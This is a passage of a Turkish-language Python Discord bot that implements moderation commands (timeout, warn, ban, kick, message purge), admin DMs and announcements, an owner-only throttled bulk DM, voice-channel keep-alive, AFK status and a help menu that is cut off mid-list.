            color=0xffff00,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
        embed.add_field(name="⏱️ Süre", value=f"```{sure_text}```", inline=False)
        embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        embed.add_field(name="📩 DM Bildirimi", value="✅ Gönderildi" if dm_sent else "❌ Gönderilemedi", inline=True)
        embed.set_thumbnail(url=kullanici.display_avatar.url)
        embed.set_footer(text=f"Kullanıcı ID: {kullanici.id}")
        
        await interaction.response.send_message(embed=embed)
        await send_mod_log("TIMEOUT", interaction.user, kullanici, sebep, f"Süre: {sure_text}", guild_id=interaction.guild.id)
        
    except discord.Forbidden:
        await interaction.response.send_message("Bu kullanıcıyı susturma yetkim yok!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def untimeout_user_slash(interaction: discord.Interaction, kullanici: discord.Member):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    try:
        await kullanici.timeout(None)
        
        dm_embed = discord.Embed(
            title="🔊 SUSTURMANIZ KALDIRILDI",
            description=f"**{interaction.guild.name}** sunucusundaki susturmanız kaldırıldı!",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
        dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
        dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        dm_embed.set_footer(text="DEHŞET Moderation System")
        
        try:
            await kullanici.send(embed=dm_embed)
            dm_sent = True
        except:
            dm_sent = False
        
        embed = discord.Embed(
            title="🔊 SUSTURMA KALDIRILDI",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
        embed.add_field(name="📩 DM Bildirimi", value="✅ Gönderildi" if dm_sent else "❌ Gönderilemedi", inline=True)
        embed.set_thumbnail(url=kullanici.display_avatar.url)
        embed.set_footer(text=f"Kullanıcı ID: {kullanici.id}")
        
        await interaction.response.send_message(embed=embed)
        await send_mod_log("UNTIMEOUT", interaction.user, kullanici, guild_id=interaction.guild.id)
        
    except discord.Forbidden:
        await interaction.response.send_message("Bu işlemi yapma yetkim yok!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def warn_user_slash(interaction: discord.Interaction, kullanici: discord.Member, sebep: str):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    user_id = str(kullanici.id)
    guild_id = str(interaction.guild.id)
    
    if guild_id not in WARNINGS:
        WARNINGS[guild_id] = {}
    if user_id not in WARNINGS[guild_id]:
        WARNINGS[guild_id][user_id] = []
    
    warning = {
        "reason": sebep,
        "moderator": interaction.user.id,
        "timestamp": datetime.datetime.now().isoformat()
    }
    WARNINGS[guild_id][user_id].append(warning)
    save_warnings()
    
    warn_count = len(WARNINGS[guild_id][user_id])
    
    dm_embed = discord.Embed(
        title="⚠️ UYARI ALDINIZ",
        description=f"**{interaction.guild.name}** sunucusunda uyarı aldınız!",
        color=0xffcc00,
        timestamp=datetime.datetime.now()
    )
    dm_embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
    dm_embed.add_field(name="⚠️ Toplam Uyarı", value=f"```{warn_count} uyarı```", inline=False)
    dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
    dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
    dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
    dm_embed.set_footer(text="DEHŞET Moderation System")
    
    try:
        await kullanici.send(embed=dm_embed)
        dm_sent = True
    except:
        dm_sent = False
    
    embed = discord.Embed(
        title="⚠️ KULLANICI UYARILDI",
        color=0xffcc00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
    embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
    embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
    embed.add_field(name="⚠️ Toplam Uyarı", value=f"{warn_count} uyarı", inline=True)
    embed.add_field(name="📩 DM Bildirimi", value="✅ Gönderildi" if dm_sent else "❌ Gönderilemedi", inline=True)
    embed.set_thumbnail(url=kullanici.display_avatar.url)
    embed.set_footer(text=f"Kullanıcı ID: {kullanici.id}")
    
    await interaction.response.send_message(embed=embed)
    await send_mod_log("WARN", interaction.user, kullanici, sebep, f"Toplam uyarı: {warn_count}", guild_id=interaction.guild.id)

async def show_warnings_slash(interaction: discord.Interaction, kullanici: discord.Member):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    user_id = str(kullanici.id)
    guild_id = str(interaction.guild.id)
    
    if guild_id not in WARNINGS or user_id not in WARNINGS[guild_id] or not WARNINGS[guild_id][user_id]:
        embed = discord.Embed(
            title="Uyarı Bulunamadı",
            description=f"**{kullanici.name}** için uyarı bulunamadı!",
            color=0x00ff00
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    warnings_list = WARNINGS[guild_id][user_id]
    
    embed = discord.Embed(
        title=f"{kullanici.name} - Uyarılar",
        description=f"Toplam **{len(warnings_list)}** uyarı",
        color=0xffcc00
    )
    
    for i, warn in enumerate(warnings_list[-10:], 1):
        embed.add_field(
            name=f"Uyarı #{i}",
            value=f"**Sebep:** {warn['reason']}\n**Tarih:** {warn['timestamp'][:10]}",
            inline=False
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

async def clear_warnings_slash(interaction: discord.Interaction, kullanici: discord.Member):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    user_id = str(kullanici.id)
    guild_id = str(interaction.guild.id)
    
    if guild_id in WARNINGS and user_id in WARNINGS[guild_id]:
        del WARNINGS[guild_id][user_id]
        save_warnings()
    
    embed = discord.Embed(
        title="✅ UYARILAR TEMİZLENDİ",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
    embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
    embed.set_thumbnail(url=kullanici.display_avatar.url)
    embed.set_footer(text="DEHŞET Moderation System")
    
    await interaction.response.send_message(embed=embed)
    await send_mod_log("UYARI SİL", interaction.user, kullanici, "Tüm uyarılar silindi", guild_id=interaction.guild.id)

async def clear_messages_slash(interaction: discord.Interaction, miktar: int, kullanici: discord.Member = None):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if miktar < 1 or miktar > 100:
        await interaction.response.send_message("Miktar 1-100 arasında olmalı!", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        if kullanici:
            deleted = await interaction.channel.purge(limit=miktar, check=lambda m: m.author.id == kullanici.id)
        else:
            deleted = await interaction.channel.purge(limit=miktar)
        
        embed = discord.Embed(
            title="🗑️ MESAJLAR SİLİNDİ",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="📝 Silinen Mesaj", value=f"```{len(deleted)} adet```", inline=True)
        embed.add_field(name="📍 Kanal", value=f"{interaction.channel.mention}", inline=True)
        if kullanici:
            embed.add_field(name="👤 Hedef Kullanıcı", value=f"{kullanici.mention}", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}", inline=True)
        embed.set_footer(text="DEHŞET Moderation System")
        
        await interaction.followup.send(embed=embed, ephemeral=True)
        
    except discord.Forbidden:
        await interaction.followup.send("Mesajları silme yetkim yok!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Hata: {e}", ephemeral=True)

async def send_dm_slash(interaction: discord.Interaction, kullanici: discord.Member, mesaj: str):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    try:
        dm_embed = discord.Embed(
            title=f"📩 {interaction.guild.name}",
            description=mesaj,
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        dm_embed.set_footer(text=f"Gönderen: {interaction.user.name}")
        
        await kullanici.send(embed=dm_embed)
        
        success_embed = discord.Embed(
            title="📩 MESAJ GÖNDERİLDİ",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        success_embed.add_field(name="👤 Alıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        success_embed.add_field(name="🛡️ Gönderen", value=f"{interaction.user.mention}", inline=True)
        success_embed.add_field(name="📝 Mesaj", value=f"```{mesaj[:200]}```", inline=False)
        success_embed.set_thumbnail(url=kullanici.display_avatar.url)
        success_embed.set_footer(text="DEHŞET Messaging System")
        
        await interaction.response.send_message(embed=success_embed, ephemeral=True)
        await send_mod_log("DM", interaction.user, kullanici, mesaj[:100], guild_id=interaction.guild.id)
        
    except discord.Forbidden:
        error_embed = discord.Embed(
            title="❌ MESAJ GÖNDERİLEMEDİ",
            description=f"**{kullanici.name}** kullanıcısının DM'leri kapalı!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def announce_slash(interaction: discord.Interaction, mesaj: str, kanal: discord.TextChannel = None, rol: discord.Role = None):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    target_channel = kanal or interaction.channel
    
    announce_embed = discord.Embed(
        title="📢 DUYURU",
        description=mesaj,
        color=0x9b59b6,
        timestamp=datetime.datetime.now()
    )
    announce_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
    announce_embed.set_footer(text=f"Duyuran: {interaction.user.name}", icon_url=interaction.user.display_avatar.url)
    
    try:
        content = rol.mention if rol else None
        await target_channel.send(content=content, embed=announce_embed)
        
        success_embed = discord.Embed(
            title="📢 DUYURU GÖNDERİLDİ",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        success_embed.add_field(name="📍 Kanal", value=f"{target_channel.mention}", inline=True)
        success_embed.add_field(name="🛡️ Gönderen", value=f"{interaction.user.mention}", inline=True)
        if rol:
            success_embed.add_field(name="🏷️ Etiketlenen Rol", value=f"{rol.mention}", inline=True)
        success_embed.add_field(name="📝 Mesaj", value=f"```{mesaj[:200]}```", inline=False)
        success_embed.set_footer(text="DEHŞET Announcement System")
        
        await interaction.response.send_message(embed=success_embed, ephemeral=True)
        
    except discord.Forbidden:
        error_embed = discord.Embed(
            title="❌ DUYURU GÖNDERİLEMEDİ",
            description=f"**{target_channel.name}** kanalına mesaj gönderme yetkim yok!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def bulk_dm_slash(interaction: discord.Interaction, mesaj: str, onayla: bool, rol: discord.Role = None):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Bu komutu sadece bot sahibi kullanabilir!", ephemeral=True)
        return
    
    if not onayla:
        await interaction.response.send_message("İşlemi onaylamak için `onayla` parametresini `True` yapın!", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    if rol:
        members = [m for m in rol.members if not m.bot]
    else:
        members = [m for m in interaction.guild.members if not m.bot]
    
    if len(members) > 100:
        await interaction.followup.send(f"Çok fazla kullanıcı ({len(members)})! Bir rol seçerek daraltın.", ephemeral=True)
        return
    
    embed = discord.Embed(
        title=f"{interaction.guild.name} - Toplu Mesaj",
        description=mesaj,
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text="Toplu Mesaj Sistemi")
    
    sent = 0
    failed = 0
    
    progress_msg = await interaction.followup.send(f"Gönderiliyor... 0/{len(members)}", ephemeral=True)
    
    for i, member in enumerate(members):
        try:
            await member.send(embed=embed)
            sent += 1
        except:
            failed += 1
        
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit(content=f"Gönderiliyor... {i + 1}/{len(members)}")
            except:
                pass
        
        await asyncio.sleep(1.5)
    
    result_embed = discord.Embed(
        title="Toplu DM Tamamlandı",
        description=f"**{sent}** kullanıcıya gönderildi, **{failed}** başarısız!",
        color=0x00ff00 if failed == 0 else 0xffcc00
    )
    
    await progress_msg.edit(content=None, embed=result_embed)
    await send_mod_log("TOPLU DM", interaction.user, interaction.guild, f"Mesaj: {mesaj[:50]}...", f"Gönderilen: {sent}, Başarısız: {failed}", guild_id=interaction.guild.id)

@bot.command(name="seskatil", aliases=["vkatil", "voice", "ses"])
async def voice_join(ctx, kanal_id: str = None):
    """Ses kanalına bağlan"""
    global VOICE_CHANNEL_ID, VOICE_GUILD_ID, voice_reconnect_enabled
    
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece owner kullanabilir!")
        return
    
    if kanal_id:
        try:
            channel_id = int(kanal_id)
            channel = bot.get_channel(channel_id)
            if not channel or not isinstance(channel, discord.VoiceChannel):
                await ctx.reply("Geçerli bir ses kanalı ID'si girin!")
                return
        except ValueError:
            await ctx.reply("Geçerli bir ses kanalı ID'si girin!")
            return
    else:
        if ctx.author.voice and ctx.author.voice.channel:
            channel = ctx.author.voice.channel
        else:
            await ctx.reply("Bir ses kanalında olmalısın veya kanal ID'si vermelisin!\nKullanım: `!seskatil <kanal_id>`")
            return
    
    try:
        if ctx.guild.voice_client:
            await ctx.guild.voice_client.disconnect()
        
        await channel.connect(self_deaf=True)
        VOICE_CHANNEL_ID = channel.id
        VOICE_GUILD_ID = ctx.guild.id
        voice_reconnect_enabled = True
        
        embed = discord.Embed(
            title="🔊 Ses Kanalına Bağlandı",
            description=f"**{channel.name}** kanalına bağlandım!",
            color=0x00ff00
        )
        embed.add_field(name="Kanal ID", value=f"`{channel.id}`", inline=True)
        embed.add_field(name="Otomatik Bağlanma", value="Aktif", inline=True)
        embed.set_footer(text="Bot düşerse otomatik yeniden bağlanır")
        await ctx.reply(embed=embed)
        
    except discord.Forbidden:
        await ctx.reply("Bu kanala bağlanma yetkim yok!")
    except Exception as e:
        await ctx.reply(f"Hata: {str(e)}")

@bot.command(name="sesayril", aliases=["vayril", "leave", "ayril"])
async def voice_leave(ctx):
    """Ses kanalından ayrıl"""
    global VOICE_CHANNEL_ID, VOICE_GUILD_ID, voice_reconnect_enabled
    
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece owner kullanabilir!")
        return
    
    if ctx.guild.voice_client:
        voice_reconnect_enabled = False
        VOICE_CHANNEL_ID = None
        VOICE_GUILD_ID = None
        await ctx.guild.voice_client.disconnect()
        
        embed = discord.Embed(
            title="🔇 Ses Kanalından Ayrıldı",
            description="Ses kanalından ayrıldım!",
            color=0xff0000
        )
        embed.add_field(name="Otomatik Bağlanma", value="Devre Dışı", inline=True)
        await ctx.reply(embed=embed)
    else:
        await ctx.reply("Zaten bir ses kanalında değilim!")

@bot.command(name="sesdur", aliases=["voicestatus", "vdur"])
async def voice_status(ctx):
    """Ses durumunu göster"""
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece owner kullanabilir!")
        return
    
    embed = discord.Embed(
        title="🎵 Ses Durumu",
        color=0x9b59b6
    )
    
    if ctx.guild.voice_client and ctx.guild.voice_client.is_connected():
        channel = ctx.guild.voice_client.channel
        embed.add_field(name="Durum", value="🟢 Bağlı", inline=True)
        embed.add_field(name="Kanal", value=f"{channel.name}", inline=True)
        embed.add_field(name="Kanal ID", value=f"`{channel.id}`", inline=True)
    else:
        embed.add_field(name="Durum", value="🔴 Bağlı Değil", inline=True)
    
    embed.add_field(name="Otomatik Bağlanma", value="Aktif" if voice_reconnect_enabled else "Devre Dışı", inline=True)
    
    if VOICE_CHANNEL_ID:
        embed.add_field(name="Kayıtlı Kanal ID", value=f"`{VOICE_CHANNEL_ID}`", inline=True)
    
    await ctx.reply(embed=embed)

async def reconnect_to_voice():
    """Ses kanalına yeniden bağlan"""
    if not voice_reconnect_enabled or not VOICE_CHANNEL_ID or not VOICE_GUILD_ID:
        return
    
    await asyncio.sleep(5)
    
    try:
        guild = bot.get_guild(VOICE_GUILD_ID)
        if not guild:
            return
        
        channel = guild.get_channel(VOICE_CHANNEL_ID)
        if not channel or not isinstance(channel, discord.VoiceChannel):
            return
        
        if guild.voice_client and guild.voice_client.is_connected():
            return
        
        await channel.connect(self_deaf=True)
        print(f"[VOICE] Ses kanalına yeniden bağlandı: {channel.name}")
    except Exception as e:
        print(f"[VOICE] Yeniden bağlanma hatası: {e}")

async def auto_join_voice():
    """Bot başladığında otomatik ses kanalına bağlan"""
    await asyncio.sleep(10)
    
    try:
        guild = bot.get_guild(VOICE_GUILD_ID)
        if not guild:
            print(f"[VOICE] Sunucu bulunamadı: {VOICE_GUILD_ID}")
            return
        
        channel = guild.get_channel(VOICE_CHANNEL_ID)
        if not channel or not isinstance(channel, discord.VoiceChannel):
            print(f"[VOICE] Ses kanalı bulunamadı: {VOICE_CHANNEL_ID}")
            return
        
        if guild.voice_client and guild.voice_client.is_connected():
            print(f"[VOICE] Zaten bağlı: {channel.name}")
            return
        
        await channel.connect(self_deaf=True)
        print(f"[VOICE] Otomatik bağlandı: {channel.name}")
    except Exception as e:
        print(f"[VOICE] Otomatik bağlanma hatası: {e}")
        await asyncio.sleep(30)
        asyncio.create_task(auto_join_voice())

async def voice_keep_alive():
    """Ses bağlantısını sürekli kontrol et ve düşerse yeniden bağlan"""
    await bot.wait_until_ready()
    await asyncio.sleep(60)
    
    while not bot.is_closed():
        try:
            if voice_reconnect_enabled and VOICE_CHANNEL_ID and VOICE_GUILD_ID:
                guild = bot.get_guild(VOICE_GUILD_ID)
                if guild:
                    if guild.voice_client and guild.voice_client.is_connected():
                        pass
                    else:
                        channel = guild.get_channel(VOICE_CHANNEL_ID)
                        if channel and isinstance(channel, discord.VoiceChannel):
                            try:
                                await channel.connect(self_deaf=True)
                                print(f"[VOICE-KEEPALIVE] Yeniden bağlandı: {channel.name}")
                            except discord.ClientException:
                                pass
                            except Exception as e:
                                print(f"[VOICE-KEEPALIVE] Bağlanma hatası: {e}")
        except Exception as e:
            print(f"[VOICE-KEEPALIVE] Kontrol hatası: {e}")
        
        await asyncio.sleep(10)

@bot.command(name="afk")
async def afk_command(ctx, *, sebep: str = "AFK"):
    """AFK modunu aktifleştir"""
    global afk_users
    user_id = str(ctx.author.id)
    
    afk_users[user_id] = {
        "reason": sebep,
        "time": datetime.datetime.now().isoformat(),
        "guild_id": ctx.guild.id
    }
    save_afk_users()
    
    embed = discord.Embed(
        title="💤 AFK Modu Aktif",
        description=f"{ctx.author.mention} artık AFK!",
        color=0x9b59b6,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Sebep", value=sebep, inline=False)
    embed.set_footer(text="Mesaj yazınca AFK modundan çıkarsın")
    await ctx.reply(embed=embed)

@bot.command(name="afksil", aliases=["afktemizle"])
async def afk_clear_command(ctx):
    """AFK modunu kapat"""
    global afk_users
    user_id = str(ctx.author.id)
    
    if user_id in afk_users:
        del afk_users[user_id]
        save_afk_users()
        await ctx.reply("✅ AFK modundan çıktın!")
    else:
        await ctx.reply("Zaten AFK değilsin!")

@bot.command(name="ping")
async def prefix_ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(
        title="🏓 Pong!",
        description=f"**Bot Gecikmesi:** `{latency}ms`",
        color=0x00ff00 if latency < 200 else 0xffcc00 if latency < 500 else 0xff0000
    )
    await ctx.reply(embed=embed)

@bot.command(name="ban")
async def prefix_ban(ctx, kullanici: discord.Member, *, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    if kullanici.id in OWNER_IDS:
        await ctx.reply("tanriyi nasil banlayabilirimki?")
        return
    if kullanici.top_role >= ctx.author.top_role and not is_owner(ctx.author.id):
        await ctx.reply("Bu kullanıcıyı yasaklama yetkiniz yok!")
        return
    try:
        await kullanici.ban(reason=f"{ctx.author.name}: {sebep}")
        embed = discord.Embed(title="Kullanıcı Yasaklandı", description=f"**{kullanici.name}** sunucudan yasaklandı!", color=0xff0000)
        embed.add_field(name="Sebep", value=sebep, inline=False)
        await ctx.reply(embed=embed)
        await send_mod_log("BAN", ctx.author, kullanici, sebep, guild_id=ctx.guild.id)
    except discord.Forbidden:
        await ctx.reply("Bu kullanıcıyı yasaklama yetkim yok!")

@bot.command(name="unban", aliases=["bankaldir", "banac"])
async def prefix_unban(ctx, kullanici_id: str):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    try:
        user_id = int(kullanici_id.replace("<@", "").replace(">", "").replace("!", ""))
        banned_users = [ban async for ban in ctx.guild.bans()]
        user_to_unban = None
        for ban_entry in banned_users:
            if ban_entry.user.id == user_id:
                user_to_unban = ban_entry.user
                break
        if user_to_unban is None:
            await ctx.reply("Bu kullanıcı yasaklı listesinde bulunamadı!")
            return
        await ctx.guild.unban(user_to_unban)
        embed = discord.Embed(title="Yasak Kaldırıldı", description=f"**{user_to_unban.name}** kullanıcısının yasağı kaldırıldı!", color=0x00ff00)
        await ctx.reply(embed=embed)
        await send_mod_log("UNBAN", ctx.author, user_to_unban, guild_id=ctx.guild.id)
    except ValueError:
        await ctx.reply("Geçerli bir kullanıcı ID'si girin!")
    except discord.Forbidden:
        await ctx.reply("Bu kullanıcının yasağını kaldırma yetkim yok!")

@bot.command(name="kick")
async def prefix_kick(ctx, kullanici: discord.Member, *, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    if kullanici.top_role >= ctx.author.top_role and not is_owner(ctx.author.id):
        await ctx.reply("Bu kullanıcıyı atma yetkiniz yok!")
        return
    try:
        await kullanici.kick(reason=f"{ctx.author.name}: {sebep}")
        embed = discord.Embed(title="Kullanıcı Atıldı", description=f"**{kullanici.name}** sunucudan atıldı!", color=0xffa500)
        embed.add_field(name="Sebep", value=sebep, inline=False)
        await ctx.reply(embed=embed)
        await send_mod_log("KICK", ctx.author, kullanici, sebep, guild_id=ctx.guild.id)
    except discord.Forbidden:
        await ctx.reply("Bu kullanıcıyı atma yetkim yok!")

@bot.command(name="timeout", aliases=["mute", "sustur"])
async def prefix_timeout(ctx, kullanici: discord.Member, dakika: int, *, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    if dakika < 1 or dakika > 40320:
        await ctx.reply("Süre 1 dakika ile 28 gün arasında olmalı!")
        return
    try:
        duration = datetime.timedelta(minutes=dakika)
        await kullanici.timeout(duration, reason=f"{ctx.author.name}: {sebep}")
        embed = discord.Embed(title="Kullanıcı Susturuldu", description=f"**{kullanici.name}** susturuldu!", color=0xffff00)
        embed.add_field(name="Süre", value=f"{dakika} dakika", inline=True)
        embed.add_field(name="Sebep", value=sebep, inline=False)
        await ctx.reply(embed=embed)
        await send_mod_log("TIMEOUT", ctx.author, kullanici, sebep, f"Süre: {dakika} dakika", guild_id=ctx.guild.id)
    except discord.Forbidden:
        await ctx.reply("Bu kullanıcıyı susturma yetkim yok!")

@bot.command(name="untimeout", aliases=["unmute"])
async def prefix_untimeout(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    try:
        await kullanici.timeout(None)
        embed = discord.Embed(title="Susturma Kaldırıldı", description=f"**{kullanici.name}** artık konuşabilir!", color=0x00ff00)
        await ctx.reply(embed=embed)
        await send_mod_log("UNTIMEOUT", ctx.author, kullanici, guild_id=ctx.guild.id)
    except discord.Forbidden:
        await ctx.reply("Bu işlemi yapma yetkim yok!")

@bot.command(name="warn", aliases=["uyar"])
async def prefix_warn(ctx, kullanici: discord.Member, *, sebep: str):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    user_id = str(kullanici.id)
    guild_id = str(ctx.guild.id)
    if guild_id not in WARNINGS:
        WARNINGS[guild_id] = {}
    if user_id not in WARNINGS[guild_id]:
        WARNINGS[guild_id][user_id] = []
    warning = {"reason": sebep, "moderator": ctx.author.id, "timestamp": datetime.datetime.now().isoformat()}
    WARNINGS[guild_id][user_id].append(warning)
    save_warnings()
    warn_count = len(WARNINGS[guild_id][user_id])
    embed = discord.Embed(title="Kullanıcı Uyarıldı", description=f"**{kullanici.name}** uyarıldı!", color=0xffcc00)
    embed.add_field(name="Sebep", value=sebep, inline=False)
    embed.add_field(name="Toplam Uyarı", value=f"{warn_count} uyarı", inline=True)
    await ctx.reply(embed=embed)
    await send_mod_log("WARN", ctx.author, kullanici, sebep, f"Toplam uyarı: {warn_count}", guild_id=ctx.guild.id)

@bot.command(name="clear", aliases=["sil", "temizle"])
async def prefix_clear(ctx, miktar: int, kullanici: discord.Member = None):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    if miktar < 1 or miktar > 100:
        await ctx.reply("Miktar 1-100 arasında olmalı!")
        return
    try:
        if kullanici:
            deleted = await ctx.channel.purge(limit=miktar + 1, check=lambda m: m.author.id == kullanici.id)
            msg = await ctx.reply(f"**{kullanici.name}** kullanıcısına ait **{len(deleted)}** mesaj silindi!")
        else:
            deleted = await ctx.channel.purge(limit=miktar + 1)
            msg = await ctx.reply(f"**{len(deleted) - 1}** mesaj silindi!")
        await asyncio.sleep(3)
        await msg.delete()
    except discord.Forbidden:
        await ctx.reply("Mesajları silme yetkim yok!")

@bot.command(name="dm")
async def prefix_dm(ctx, kullanici: discord.Member, *, mesaj: str):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    try:
        embed = discord.Embed(title=f"{ctx.guild.name} - Özel Mesaj", description=mesaj, color=0x3498db)
        embed.set_footer(text=f"Gönderen: {ctx.author.name}")
        await kullanici.send(embed=embed)
        await ctx.reply(f"**{kullanici.name}** kullanıcısına mesaj gönderildi!")
        await send_mod_log("DM", ctx.author, kullanici, mesaj[:100], guild_id=ctx.guild.id)
    except discord.Forbidden:
        await ctx.reply("Bu kullanıcıya mesaj gönderilemedi! (DM kapalı olabilir)")

@bot.command(name="duyuru", aliases=["announce"])
async def prefix_announce(ctx, *, mesaj: str):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    embed = discord.Embed(title="Duyuru", description=mesaj, color=0x9b59b6, timestamp=datetime.datetime.now())
    embed.set_footer(text=f"Duyuran: {ctx.author.name}")
    await ctx.reply(embed=embed)

@bot.command(name="yardim", aliases=["komutlar", "help"])
async def prefix_help(ctx):
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="📚 DEHŞET BOT - PREFIX KOMUTLARI",
        description="Tüm komutlar `!` prefix'i ile kullanılır",
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    
    embed.add_field(
        name="📋 **TEMEL KOMUTLAR**",
        value=(
            "`!haklarim` - Hak durumunu gör\n"
            "`!pre` - Fiyat listesi\n"
            "`!boost` - Boost paketleri\n"
            "`!istatistik` - Sunucu istatistikleri\n"
            "`!afk [sebep]` - AFK modunu aç"
        ),
        inline=False
    )
    
    if ctx.author.id in OWNER_IDS or is_authorized_admin(ctx.author.id):
        embed.add_field(
            name="🔨 **MODERASYON**",
            value=(
                "`!ban <@user> [sebep]` - Yasakla\n"
                "`!unban <id>` - Yasağı kaldır\n"
                "`!kick <@user> [sebep]` - At\n"
                "`!timeout <@user> <dk>` - Sustur\n"
                "`!untimeout <@user>` - Susturmayı kaldır\n"
                "`!warn <@user> <sebep>` - Uyar\n"
                "`!uyarilar <@user>` - Uyarıları gör\n"
                "`!uyarisil <@user>` - Uyarıları sil\n"
                "`!clear <sayı>` - Mesaj sil"
            ),
            inline=False
        )
        
        embed.add_field(
            name="📩 **MESAJLAŞMA**",
            value=(
                "`!dm <@user> <mesaj>` - DM gönder\n"
                "`!duyuru <mesaj>` - Duyuru yap\n"
                "`!topludm <mesaj>` - Herkese DM"
            ),
            inline=False
        )
        
    
    embed.add_field(
        name="🎉 **ETKİNLİKLER**",
        value=(
            "`!anket` - Anket oluştur\n"
